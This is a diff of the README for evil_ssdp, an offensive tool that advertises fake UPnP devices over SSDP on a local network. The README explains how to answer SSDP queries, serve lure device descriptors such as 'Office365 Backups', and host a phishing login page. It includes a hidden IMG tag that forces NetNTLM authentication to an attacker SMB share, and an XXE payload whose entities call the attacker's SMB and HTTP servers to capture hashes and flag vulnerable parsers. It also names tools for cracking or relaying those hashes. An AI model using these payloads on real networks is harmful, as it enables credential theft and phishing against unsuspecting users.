@@ -87,7 +87,7 @@ In your phishing page (`present.html`), use variables like the following for add
 ```
 # The following line will initiate a NetNTLM challenge/response using the IP address of either the interface
 # you provide or an optionally specified IP address:
-<img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
+<img src="file://///$smb_server/smb/hash.jpg" style="display: none;" />
 
 # The following will leverage optionally specified URL redirection. This is handy when used with
 # basic authentication to redirect to a valid site. This line is built in to the microsoft-azure template:
@@ -105,7 +105,7 @@ In your phishing page (`present.html`), use variables like the following for add
 <form method="POST" action="/ssdp/do_login.html" name="LoginForm" autocomplete="off">
 ```
 
-The tool currently only correctly creates devices for the UPNP 'rootdevice' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well. There is still a lot to explore here with exploiting specific applications and the way they expect and leverage UPNP devices.
+The tool currently only correctly creates devices for the UPNP 'Basic' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well. There is still a lot to explore here with exploiting specific applications and the way they expect and leverage UPNP devices.
 
 # Technical Details
 Simple Service Discovery Protocol (SSDP) is used by Operating Systems (Windows, MacOS, Linux, IOS, Android, etc) and applications (Spotify, Youtube, etc) to discover shared devices on a local network. It is the foundation for discovering and advertising Universal Plug & Play (UPNP) devices.
@@ -121,81 +121,79 @@ MX: 3
 
 To interact with this host, we need to capture both the source port and the 'ST' (Service Type) header. The response MUST be sent to the correct source port and SHOULD include the correct ST header. Note that it is not just the Windows OS looking for devices - scanning a typical network will show a large amount of requests from applications inside the OS (like Spotify), mobile phones, and other media devices. Windows will only play ball if you reply with the correct ST, other sources are more lenient.
 
-evilSSDP will extract the requested ST and send a reponse like the following:
+evil_ssdp will extract the requested ST and send a reponse like the following:
 
 ```
 HTTP/1.1 200 OK
 CACHE-CONTROL: max-age=1800
-DATE: Tue, 26 Jun 2018 01:06:26 GMT
-EXT: 
-LOCATION: http://192.168.1.131:8888/ssdp/device-desc.xml
-SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1
+DATE: Tue, 16 Oct 2018 20:17:12 GMT
+EXT:
+LOCATION: http://192.168.1.214:8888/ssdp/device-desc.xml
+OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
+01-NLS: uuid:7f7cc7e1-b631-86f0-ebb2-3f4504b58f5c
+SERVER: UPnP/1.0
 ST: upnp:rootdevice
-USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice
+USN: uuid:7f7cc7e1-b631-86f0-ebb2-3f4504b58f5c::upnp:rootdevice
 BOOTID.UPNP.ORG: 0
 CONFIGID.UPNP.ORG: 1
 ```
 
-The location IP, ST, and date are constructed dynamically. This tells the requestor where to find more information about our device. Here, we are forcing Windows (and other requestors) to access our 'Device Descriptor' xml file and parse it. The USN is just a random string and needs only to be unique and formatted properly.
+The headers (specifically LOCATION, 01-NLS, ST, and USN) are constructed dynamically. This tells the requestor where to find more information about our device. Here, we are forcing Windows (and other requestors) to access our 'Device Descriptor' xml file and parse it. The USN is just a random string and needs only to be unique and formatted properly.
 
-evilSSDP will pull the 'device.xml' file from the chosen templates folder and dynamically plug in some variables such as your IP address. This 'Device Descriptor' file is where you can customize some juicy-sounding friendly names and descriptions. It looks like this:
-
-```
-<root>
-    <specVersion>
-        <major>1</major>
-        <minor>0</minor>
-    </specVersion>
-    <device>
-        <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
-        <friendlyName>IT Password Vault</friendlyName>
-        <manufacturer>PasSecure</manufacturer>
-        <manufacturerURL>http://passecure.com</manufacturerURL>
-        <modelDescription>Corporate Password Repository</modelDescription>
-        <modelName>Core</modelName>
-        <modelNumber>1337</modelNumber>
-        <modelURL>http://passsecure.com/1337</modelURL>
-        <serialNumber>1337</serialNumber>
-        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
-        <serviceList>
-            <service>
-                <URLBase>http://$localIp:$localPort</URLBase>
-                <serviceType>urn:ecorp.co:service:ePNP:1</serviceType>
-                <serviceId>urn:epnp.ecorp.co:serviceId:ePNP</serviceId>
-                <controlURL>/epnp</controlURL>
-                <eventSubURL/>
-                <SCPDURL>/service-desc.xml</SCPDURL>
-            </service>
-        </serviceList>
-        <presentationURL>http://$localIp:$localPort/present.html</presentationURL>
-        </device>
-    </root>
+evil_ssdp will pull the 'device.xml' file from the chosen templates folder and dynamically plug in some variables such as your IP address. This 'Device Descriptor' file is where you can customize some juicy-sounding friendly names and descriptions. It looks like this:
 
 ```
+<?xml version="1.0"?>
+<root xmlns="urn:schemas-upnp-org:device-1-0">
+  <specVersion>
+    <major>1</major>
+    <minor>0</minor>
+  </specVersion>
+  <URLBase>http://$local_ip:$local_port</URLBase>
+  <device>
+    <presentationURL>http://$local_ip:$local_port/present.html</presentationURL>
+    <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
+    <friendlyName>Office365 Backups</friendlyName>
+    <modelDescription>Secure Storage for Office365</modelDescription>
+    <manufacturer>MS Office</manufacturer>
+    <modelName>Office 365 Backups</modelName>
+    <UDN>$session_usn</UDN>
+    <serviceList>
+      <service>
+        <serviceType>urn:schemas-upnp-org:device:Basic:1</serviceType>
+        <serviceId>urn:schemas-upnp-org:device:Basic</serviceId>
+        <controlURL>/ssdp/service-desc.xml</controlURL>
+        <eventSubURL>/ssdp/service-desc.xml</eventSubURL>
+        <SCPDURL>/ssdp/service-desc.xml</SCPDURL>
+      </service>
+    </serviceList>
 
-A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evilSSDP will host this file automatically (present.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).
+  </device>
+</root>
+```
+
+A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evil_ssdp will host this file automatically (present.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).
 
 The IMG tage looks like this:
 
 ```
-<img src="file://///$localIp/smb/hash.jpg" style="display: none;" /><br>
+<img src="file://///$local_ip/smb/hash.jpg" style="display: none;" /><br>
 ```
 
 # Zero-Day Hunting
 By default, this tool essentially forces devices on the network to parse an XML file. A well-known attack against applications that parse XML exists - [XML External Entity Processing (XXE)](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing).
 
-This type of attack against UPNP devices in likely overlooked - simply because the attack method is complex and not readily apparent. However, evilSSDP makes it very easy to test for vulnerable devices on your network. Simply run the tool and look for a big `[XXE VULN!!!]` in the output. NOTE: using the xxe template will likely not spawn visibile evil devices across the LAN, it is meant only for zero-interaction scenarios.
+This type of attack against UPNP devices in likely overlooked - simply because the attack method is complex and not readily apparent. However, evil_ssdp makes it very easy to test for vulnerable devices on your network. Simply run the tool and look for a big `[XXE VULN!!!]` in the output. NOTE: using the xxe template will likely not spawn visibile evil devices across the LAN, it is meant only for zero-interaction scenarios.
 
 This is accomplished by providing a Device Descriptor XML file with the following content:
 
 ```
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ 
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file://///$smbServer/smb/hash.jpg" >
-<!ENTITY xxe-url SYSTEM "http://$localIp:$localPort/ssdp/xxe.html" >
+<?xml version="1.0"?>
+<!DOCTYPE data [ 
+<!ENTITY xxe SYSTEM "file://///$smb_server/smb/hash.jpg" >
+<!ENTITY xxe-url SYSTEM "http://$local_ip:$local_port/ssdp/xxe.html" >
 ]>
-<hello>&xxe;&xxe-url;</hello>
+<data>&xxe;&xxe-url;</data>
 ```
 
 When a vulnerable XML parser reads this file, it will automatically mount the SMB share (allowing you to crack the hash or relay) as well as access an HTTP URL to notify you it was discovered. The notification will contain the HTTP headers and an IP address, which should give you some info on the vulnerable application. If you see this, please do contact the vendor to fix the issue. Also, I would love to hear about any zero days you find using the tool. And please do mention the tool in your CVE.
@@ -204,7 +202,7 @@ When a vulnerable XML parser reads this file, it will automatically mount the SM
 # Thanks
 - Thanks to ZeWarren and his project [here](https://github.com/ZeWaren/python-upnp-ssdp-example). I used this extensively to understand how to get the basics for SSDP working.
 - Thanks to the pentest geek and their phishing templates [here](https://github.com/pentestgeek/phishing-frenzy-templates). I used the Office365 login page from there.
-- Thanks to [Dwight Hohnstein](https://github.com/djhohnstein) for his great work to implement cool features like basic authentication, realm support, and automatic redirection in evilSSDP. He kindly wrote and provided code to make this work.
+- Thanks to [Dwight Hohnstein](https://github.com/djhohnstein) for his great work to implement cool features like basic authentication, realm support, and automatic redirection in evil_ssdp. He kindly wrote and provided code to make this work.
 - Thanks to the following folks for submitting bugfixes:
     - Nadar, Ender Akbas
 
